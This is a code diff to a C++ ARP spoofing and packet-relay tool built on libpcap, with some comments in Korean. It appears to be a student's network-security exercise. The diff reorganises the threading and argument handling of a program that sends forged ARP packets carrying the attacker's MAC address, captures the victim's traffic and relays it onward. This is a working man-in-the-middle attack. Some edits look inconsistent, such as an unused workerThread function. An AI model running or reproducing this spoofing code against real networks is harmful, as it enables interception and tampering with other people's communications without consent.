@@ -10,7 +10,7 @@
 #include <queue>
 using namespace std;
 
-queue<pair<const u_char*, size_t>> packets; //패킷 큐. 패킷과 패킷사이즈 저장.
+queue<pair<const u_char*, size_t>> packets;
 using MAC = uint8_t[6];
 
 #pragma pack(push, 1)
@@ -53,7 +53,6 @@ void macFstr(string strMac, MAC &mac){
     }
 }
 
-
 void getMymac(string inter, MAC &mac) {
     string command = "ifconfig " + inter;
     string output = cmd(command);
@@ -81,18 +80,17 @@ void getTmac(string tip, MAC &mac) {
     macFstr(output, mac);
 }
 
-void arpSpoof(string senderIp, string targetIp, string inter) { 
+void arpSpoof(string inter, string senderIp, string targetIp) { 
     EthArpPacket packet;
 
     MAC smac;
-    getSmac(senderIp, smac); //sender mac 받아오기
+    getSmac(senderIp, smac); //sender mac
     MAC mymac;
-    getMymac(inter, mymac); //Attacker mac(나)
+    getMymac(inter, mymac); //Attacker mac
 
     packet.eth_.dmac_ = smac;
     packet.eth_.smac_ = mymac;
     packet.eth_.type_ = htons(EthHdr::Arp);
-
     packet.arp_.hrd_ = htons(ArpHdr::ETHER);
     packet.arp_.pro_ = htons(EthHdr::Ip4);
     packet.arp_.hln_ = Mac::SIZE;
@@ -124,10 +122,13 @@ void packetHandler(u_char* userData, const struct pcap_pkthdr* pkthdr, const u_c
     cout<<"put one packet to queue"<<endl;
 }
 
-void Listen(string inter, string smac) { //스레드2, pcap_loop가 자체적으로 반복.
+void Listen(string inter, string sip) { //스레드2, pcap_loop.
     const char* dev = inter.c_str();
     char errbuf[PCAP_ERRBUF_SIZE];
     pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+
+    MAC mac;
+    string smac=getSmac(sip, mac);//s ip
    
     if (handle == nullptr) {
         cerr << "Couldn't open interface eth0: " << errbuf << endl;
@@ -146,10 +147,14 @@ void Listen(string inter, string smac) { //스레드2, pcap_loop가 자체적으
     pcap_loop(handle, 0, packetHandler, nullptr); //패킷 리슨.
 }
 
-void relay(char* inter, string senderIP, MAC targetmac, MAC mymac) { 
+void relay(char* inter, string senderIP, string targetIP) { //MAC targetmac, MAC mymac
     const char* dev = inter;
     char errbuf[PCAP_ERRBUF_SIZE];
-    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf); 
+    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
+
+    MAC targetmac, mymac;
+    getTmac(targetIP, targetmac);
+    getMymac(inter, mymac);
 
     while (1) {
         if (packets.empty()) { 
@@ -184,22 +189,21 @@ void relay(char* inter, string senderIP, MAC targetmac, MAC mymac) {
     pcap_close(handle);
 }
 
-int main(int argc, char* argv[]) {
+void workerThread(char* interface, const string& senderIP, const string& targetIP) {
+    arpSpoof(interface, senderIP, targetIP);
+    Listen(interface, senderIP);
+    relay(interface, senderIP, targetIP);
+}
+
+int main(int argc, char* argv[]) { //interface, sender ip, target ip
     if (argc < 4) {    
-        cout<<"why?"<<endl;
+        cout<<"put <interface> <sender ip> <target ip>"<<endl;
 	    return 0;
     }
-    MAC mac;
-    string smac=getSmac(argv[2], mac);
-    
-    MAC targetmac, mymac;
-    getTmac(argv[3], targetmac); //
-    getMymac(argv[1], mymac); //Attacker mac(나)
 
-    thread autoArp(arpSpoof, argv[2], argv[3], argv[1]); //s ip, t ip, interface
-    thread listener(Listen, argv[1], smac);
-    thread relayGo(relay, argv[1], argv[2], targetmac, mymac);
-    //relay(char* inter, string senderIP, MAC targetmac, MAC mymac)
+    thread autoArp(arpSpoof, argv[1], argv[2], argv[3]); //use 1,2,3 / smac, mymac
+    thread listener(Listen, argv[1], argv[2]); //use 1 / smac
+    thread relayGo(relay, argv[1], argv[2], argv[3]); //use 1,2 / targetmac, mymac
 
     autoArp.detach(); //메인 스레드와 관계없이 돌아감.
     listener.detach();
@@ -208,6 +212,4 @@ int main(int argc, char* argv[]) {
     while (true) { //대기.
         this_thread::sleep_for(std::chrono::seconds(1));
     }
-
 }
-
